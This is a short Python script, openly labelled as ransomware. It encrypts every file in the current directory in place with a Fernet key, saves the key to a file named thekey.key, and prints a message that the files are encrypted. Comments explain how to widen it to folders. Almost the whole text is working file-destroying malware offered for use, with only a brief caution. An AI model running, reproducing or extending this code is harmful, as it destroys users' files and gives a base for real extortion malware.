# This is a ransomware which encrypts all the files and folders
# Use this very cautious

import os
from cryptography.fernet import Fernet

files = []

# Let's find ransomware files

for file in os.listdir():
	if file == "ransomware.py" or file == "thekey.key" or file == "ransomware_decryption.py":
		continue

# This loop only finds the files not folders in the current directory
# If you want to find all the files and folders,
# Just remove the line "if os.path.isfile(file):"
# And move the "files.append(file)" line to left as a single indentation is there

	if os.path.isfile(file):
		files.append(file)

print(files)

# key generation from fernet

key = Fernet.generate_key()

# Encrypting the key

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

# Encrypting the files/folders

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

print("Your all files are encrypted!")
